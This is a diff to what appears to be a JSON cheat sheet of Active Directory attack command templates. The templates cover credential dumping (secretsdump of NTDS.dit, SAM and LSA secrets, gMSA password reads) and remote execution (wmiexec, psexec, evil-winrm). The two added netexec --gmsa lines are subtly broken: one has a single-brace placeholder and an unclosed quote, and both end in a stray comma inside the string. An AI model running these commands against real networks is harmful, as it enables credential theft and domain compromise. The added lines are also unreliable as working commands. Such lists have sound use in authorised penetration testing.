@@ -42,6 +42,7 @@
       "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
       "impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL",
       "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "netexec ldap {IP} -u {{USER}} -p '{{PASSWORD}} -d {{DOMAIN}} --gmsa,",
       "python3 gMSADumper.py -u {{USER}} -p '{{PASSWORD}}' -d {{DOMAIN}}",
       "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --sam",
       "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --lsa",
@@ -86,6 +87,7 @@
     ],
     "post-exploitation": [
       "evil-winrm -i {{DC.DOMAIN}} -k -u {{USER}} -r {{DOMAIN}}",
+      "netexec ldap {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --gmsa,",
       "impacket-mssqlclient -K '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}' -no-pass",
       "impacket-psexec -k -no-pass '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}'",
       "impacket-secretsdump -k -no-pass {{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}",
